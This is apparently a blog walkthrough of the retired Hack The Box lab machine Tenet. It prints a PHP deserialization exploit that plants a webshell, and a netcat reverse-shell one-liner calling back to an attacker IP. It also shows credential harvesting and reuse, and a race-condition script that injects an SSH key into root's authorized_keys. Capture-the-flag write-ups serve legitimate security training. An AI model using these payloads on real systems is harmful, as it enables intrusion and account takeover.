Hello guys!

This week's machine will be **Tenet**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [egotisticalSW](https://app.hackthebox.eu/users/94858).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.

Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: *SATOR*, *AREPO*, *TENET*, *OPERA* e *ROTAS*, forming a square being TENET in the center lines. Is highly probable that these words will appear during it's resolution :smile:.

## Enumeration

As usual, started with a quick `nmap` scan to identify the published services:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.223
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

### 80/TCP - HTTP Service

Accessing this page noticed that was from the default Apache install so started right away to enumerate the directories using `gobuster` where I've found the **wordpress** directory.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.223/ -o gobuster.txt -x php,txt,html

```

Once accessed it the page was loaded without formatting and, inspecting the source code, all the assets were pointing to **tenet.htb**, which was later added to `/etc/hosts` file.

Accessing the page again, checked that it was properly rendered now and then used `wpscan` to enumerate version, users, and plugins, where I've identified this wordpress version as 5.6, no plugins and the users **protagonist** and **neil**.

As accessing the webpage again from the url `http://10.10.10.223/wordpress` errors are shown, as the image below, accessed it replacing the IP by the DNS name and the full blog is displayed, which points us to multiple wordpress installations in this box, possibly having different credentials to be harvested later on.

![HTB Tenet - 80/TCP](https://i.imgur.com/u4M23iB.png){: .align-center}

In the wordpress instance available at `http://tenet.htb/wordpress`, noticed some posts where one of them was mentioning an application called **Rotas**, which could contain some item we could abuse to get an initial foothold in this box.

> This Is Where Our Worlds Collide
> We’re looking for beta testers of our new time-management software, ‘Rotas’
> ‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.

Things gets more interesting in an older post, where user **neil** comments the content below:

> did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

Trying to access the file `sator.php` from the directory published under the dns name hasn't returned anything, but I've succeeded using the machine IP address, getting the output below:

![HTB Tenet - sator.php](https://i.imgur.com/OOaRPfQ.png){: .align-center}

As we have a backup of this file somewhere and backups are often renamed as `old` or `bak`, after a few attempts I have found the file `sator.php.bak` in the same directory as the previous, with the following content:

```php
<?php

class DatabaseExport
{
    public $user_file = 'users.txt';
    public $data = '';
    
    public function update_db()
    {
        echo '[+] Grabbing users from text file <br>';
        $this-> data = 'Success';
    }
    
    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
        echo '[] Database updated <br>';
        //    echo 'Gotta get this working properly...';
    }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```

As we can see we could exploit it using **PHP Deserialization**, once it doesn't validate the inputs received using GET method from the query string arg  **arepo**, allowing us to modify the payload to be stored in the database file.

## Initial access

The first step to the reverse shell was to create a serialized PHP payload to be sent in a request via **arepo** arg. Searching a little about it I have found [this exploit sample](https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php) which was later modified to store a simple webshell in the box, later used to get a reverse shell.

```php
<?php 

class DatabaseExport
{
    public $user_file = 'shell.php';
    public $data = '<?php system($_GET["cmd"]); ?>';
    
    public function update_db()
    {
        echo '[+] Grabbing users from text file <br>';
        $this-> data = 'Success';
    }
    
    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
        echo '[] Database updated <br>';
        //    echo 'Gotta get this working properly...';
    }
}

$url = 'http://10.10.10.223/sator.php?arepo=';
$arepo = $url . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$arepo");
print "$response";
```

After its execution, I was able to issue the `id` command by using curl as we can see below.

```bash
$ php exploit.php
[] Database updated <br>[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>   

$ curl -L http://10.10.10.223/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we had a confirmed RCE, make the call to obtain a reverse shell as the following example:

```bash
curl -G --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.136 4443 >/tmp/f" http://10.10.10.223/shell.php
```

## User Flag

Accessing the box, once we already knew that at least one wordpress instance was present, searched for the `wp-config.php` file where I got the credentials for user **neil**

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

As credential reuse is common, running `su neil` and providing the recently found password, we have succeeded in accessing the machine as this user and getting the user flag.

```bash
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ cat ~/user.txt
<redacted>
neil@tenet:~$
```

## Root Flag

In the path for root flag, decided to dump the database credentials in this machine, returning the following hashes.

```plaintext
mysql> select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
```

Before trying to crack those hashes, being `protagonist` password reused from `root`, decided to check which permissions did `neil` had by running `sudo -l`, which resulted in the output below.

```plaintext
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
    
User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

Inspecting the content of this file, we can see that it can be used to activate SSH login for `root` enforcing an existing SSH public key.

```bash
#!/bin/bash

checkAdded() {
    sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
    if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
        /bin/echo "Successfully added $sshName to authorized_keys file!"
    else
        /bin/echo "Error in adding $sshName to authorized_keys file!"
    fi
}

checkFile() {
    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
        /bin/echo "Error in creating key file!"
        if [[ -f $1 ]]; then /bin/rm $1; fi
        exit 1
    fi
}

addKey() {
    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
    (umask 110; touch $tmpName)
    /bin/echo $key >>$tmpName
    checkFile $tmpName
    /bin/cat $tmpName >>/root/.ssh/authorized_keys
    /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

As we don't have the private key, we could possibly hijack it's execution because the function `addKey` creates a temporary file containing the public key to be added to `root`'s authorized keys. If we could manage to overwrite this file during the script execution, we could inject our public key instead of the one present in the script.

The challenge here is to predict the name of the file created, once it uses the `mktemp` command, but as we have an idea of its format (`/tmp/ssh-XXXXX`) we could find a way to paste the contents from our public key to all files matching the same pattern. After some tests and research, the command `tee` was the solution, allowing us to output a content to multiple files at the same time. The simple script below was created to do this task.

```bash
#!/bin/bash
while true; do
        echo "ssh-rsa AAAA..............BBBB= root@ubuntu" | tee /tmp/ssh-* 2> /dev/null;
done
```

With the above script in execution, simply executed the bash script with `sudo` and then connected to the box with the previously created ssh private key, granting me root access and allowing to get the root flag :smiley:

```bash
neil@tenet:/tmp$ sudo  /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp$ ssh -i tenet root@tenet.htb

```

I hope you guys have enjoyed this box resolution!

See you in the next post! :smiley:
